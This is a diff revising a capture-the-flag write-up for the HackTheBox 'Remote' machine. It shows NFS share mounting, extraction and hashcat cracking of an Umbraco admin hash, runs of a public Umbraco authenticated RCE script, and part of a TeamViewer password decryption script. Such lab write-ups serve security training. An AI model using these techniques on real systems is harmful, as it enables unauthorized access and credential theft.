@@ -10,9 +10,11 @@ TODO: finish writeup, add images, clean up...wow my notes were bad on this one!
 
 ## Useful Skills and Tools
 
-#### Useful thing 1
+### Connect to and mount a remote network file share - port 2049
 
-description with generic example
+* `showmount -e 10.10.10.180`to show NFS shares 
+* `mkdir /tmp/remote` to make a local folder to mount the remote drive to
+* `mount 10.10.10.180:/site_backups /tmp/remote` to mount the available share directory onto the host machine.
 
 #### Useful thing 2
 
@@ -80,11 +82,17 @@ Nmap done: 1 IP address (1 host up) scanned in 102.49 seconds
 
 21/tcp open ftp 80/tcp open http 111/tcp open rpcbind 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 2049/tcp open nfs
 
-start with anonymous ftp login - empty folder
+### Port 21 - FTP
+
+Port 21 for FTP was open so I tried to login  using anonymous access. I was able to connect, but the folder is empty. 
+
+### Port 80 - HTTP
 
 ![](../../.gitbook/assets/1-http80.png)
 
 Acme widgets product page
+
+### Dirbuster
 
 ```text
 DirBuster 1.0-RC1 - Report
@@ -323,13 +331,13 @@ Self-enumerated
 umbraco/create.aspx
 ```
 
-Dirbuster found a huge list of standard Umbraco directories and files
+Dirbuster found a huge list of standard Umbraco directories and files, as well as a lot of random product and blog pages.
 
-A search for umbraco+vulnerabilities = [https://www.acunetix.com/vulnerabilities/web/umbraco-cms-remote-code-execution/](https://www.acunetix.com/vulnerabilities/web/umbraco-cms-remote-code-execution/)
+A search for Umbraco vulnerabilities led me to [https://www.acunetix.com/vulnerabilities/web/umbraco-cms-remote-code-execution/](https://www.acunetix.com/vulnerabilities/web/umbraco-cms-remote-code-execution/) which described a way to get remote code execution.
 
 ![](../../.gitbook/assets/2-codeeditor.png)
 
-leads to [http://10.10.10.180/umbraco/webservices/codeEditorSave.asmx](http://10.10.10.180/umbraco/webservices/codeEditorSave.asmx) 
+This led me to the page  `http://10.10.10.180/umbraco/webservices/codeEditorSave.asmx`, which should not exist on the production server.  
 
 [https://blog.gdssecurity.com/labs/2012/7/3/find-bugs-faster-with-a-webmatrix-local-reference-instance.html](https://blog.gdssecurity.com/labs/2012/7/3/find-bugs-faster-with-a-webmatrix-local-reference-instance.html)
 
@@ -339,11 +347,15 @@ rabbit hole?^
 
 ![](../../.gitbook/assets/3-umbraco.png)
 
-navigating to `/umbraco` redirects to a login page at http:10.10.10.180/umbraco/\#/login.asp
+Navigating to `/umbraco` redirected me to a login page at `http:10.10.10.180/umbraco/#/login.asp`.
 
-[https://our.umbraco.com/packages/developer-tools/umbraco-admin-reset/](https://our.umbraco.com/packages/developer-tools/umbraco-admin-reset/) - looks interesting, but didnt work
+After reading through the documentation, I tried the admin password reset found at [https://our.umbraco.com/packages/developer-tools/umbraco-admin-reset/](https://our.umbraco.com/packages/developer-tools/umbraco-admin-reset/) - looked interesting, but didn't work.
 
-since rpc is open and showing mountd service: [https://resources.infosecinstitute.com/exploiting-nfs-share](https://resources.infosecinstitute.com/exploiting-nfs-share)
+### Port 2049 - NFS
+
+since rpc is open and showing mountd service on port 2049: 
+
+* [https://resources.infosecinstitute.com/exploiting-nfs-share](https://resources.infosecinstitute.com/exploiting-nfs-share)
 
 ```text
 zweilos@kali:~/htb/remote$ showmount -e 10.10.10.180
@@ -352,6 +364,11 @@ Export list for 10.10.10.180:
 
 zweilos@kali:~/htb/remote$ mkdir /tmp/remote
 zweilos@kali:~/htb/remote$ sudo mount -t nfs 10.10.10.180:/site_backups /tmp/remote
+```
+
+Using the `showmount -e` command I was able to export the folders that were available to connect to, and list who could connect.  This share was available for everyone.  I obliged myself to the open share and mounted it to a local folder using the `mount` command.
+
+```text
 zweilos@kali:~$ cd /tmp/remote
 zweilos@kali:~$ df -k
 Filesystem                 1K-blocks     Used Available Use% Mounted on
@@ -384,19 +401,71 @@ drwx------  2 nobody 4294967294  4096 Feb 20 12:16 Views
 -rwx------  1 nobody 4294967294 28539 Feb 20 00:57 Web.config
 ```
 
-file Web.config has line:  version number
+After mounting the folder locally I was able to browse through the files at my leisure.  This seemed to be a backup of the files for the website that was hosted on port 80.  The file `Web.config` had a line that told me the version number, but there were so many files that I started searching the web to see if I could find out if there were any useful files here.
 
-[https://our.umbraco.com/forum/developers/api-questions/8905-Where-does-Umbraco-store-data](https://our.umbraco.com/forum/developers/api-questions/8905-Where-does-Umbraco-store-data)
+* [https://our.umbraco.com/forum/developers/api-questions/8905-Where-does-Umbraco-store-data](https://our.umbraco.com/forum/developers/api-questions/8905-Where-does-Umbraco-store-data)
 
 ![](../../.gitbook/assets/5-umbraco-sdf.png)
 
-App\_Data/Ubmbraco.sdf
+In the `App_Data/` folder there was supposed to be a `.sdf` file it seemed.
 
 ![](../../.gitbook/assets/4-creds.png)
 
-b8be16afba8c314ad33d812f22a04991b90e2aaa
+There was indeed a `.sdf` file, creatively named: `umbraco.sdf`.  This was a "standard database format" file, but I was still able to extract the data I needed using `vim`.  There was information for a few different users, including email addresses and password hashes.  I extracted the password hashes and sent them to hashcat for cracking.  
 
-admin@htb.local:baconandcheese
+```text
+zweilos@kali:~/htb/remote$ hashcat -O -D1,2 -a0 -m100 hashes /usr/share/wordlists/rockyou.txt
+hashcat (v6.1.1) starting...
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers applied:
+* Optimized-Kernel
+* Zero-Byte
+* Precompute-Init
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Raw-Hash
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 65 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: SHA1
+Hash.Target......: b8be16afba8c314ad33d812f22a04991b90e2aaa
+Time.Started.....: Sun Feb 21 18:57:06 2021 (5 secs)
+Time.Estimated...: Sun Feb 21 18:57:11 2021 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1910.9 kH/s (0.88ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/3 (33.33%) Digests
+Progress.........: 14344385/14344385 (100.00%)
+Rejected.........: 3094/14344385 (0.02%)
+Restore.Point....: 14344385/14344385 (100.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: badgers199 -> bacon95
+
+Started: Sun Feb 21 18:56:47 2021
+Stopped: Sun Feb 21 18:57:12 2021
+```
+
+The hash `b8be16afba8c314ad33d812f22a04991b90e2aaa` for the `admin` user cracked with the password `baconandcheese`.  
 
 ![](../../.gitbook/assets/6-friendly-cms.png)
 
@@ -404,9 +473,11 @@ after logging in
 
 ![](../../.gitbook/assets/7-user-cleanup.png)
 
-Lots of people were using this portal to try to gain access or run enumeration files it seemed.
+Lots of people were using this portal to try to gain access or run enumeration files it seemed. 
 
 ![](../../.gitbook/assets/8-ssmith.png)
+
+### Umbraco 7.12.4 Remote Code Exploit
 
 [https://github.com/noraj/Umbraco-RCE](https://github.com/noraj/Umbraco-RCE)
 
@@ -479,7 +550,6 @@ r4 = s.post(url_xslt, data=data, headers=headers)
 soup = BeautifulSoup(r4.text, 'html.parser')
 CMDOUTPUT = soup.find(id="result").getText()
 print(CMDOUTPUT)
-
 ```
 
 exploit.py
@@ -489,7 +559,7 @@ zweilos@kali:~/htb/remote$ python3 exploit.py -u admin@htb.local -p baconandchee
 iis apppool\defaultapppool
 ```
 
-it works. now time to enumerate the system \(very slow however\)
+it worked. now it was time to enumerate the system \(very slow however\)
 
 ```text
 zweilos@kali:~/htb/remote$ python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a '-NoProfile -Command ls'
@@ -560,10 +630,6 @@ zweilos@kali:~/htb/remote$ python3 exploit.py -u admin@htb.local -p baconandchee
 
 ## Road to User
 
-### Further enumeration
-
-### Finding user creds
-
 ```text
 PS C:\> whoami /all
 whoami /all
@@ -609,11 +675,11 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 ERROR: Unable to get user claims information.
 ```
 
-not much
+not much to work with, though some of the Privileges sounded interesting.
 
 ### User.txt
 
-didnt realize for a long time that I already was logged in as "User"; I had to hunt for the flag which was in the `Public` user folder `C:\Users\Public`
+didnt realize for a long time that I already was logged in as a user with access to the flag; I had to hunt for the flag which was in the `Public` user folder `C:\Users\Public`
 
 ```text
 PS C:\Users\Public> type user.txt
@@ -695,7 +761,7 @@ password = raw_un.decode('utf-16')
 print(password)
 ```
 
-using the python exploit to decrypt the password store in the reg key
+using the python exploit to decrypt the password stored in the reg key I found
 
 ```text
 zweilos@kali:~/htb/remote$ python3 teamviewer-pass.py 
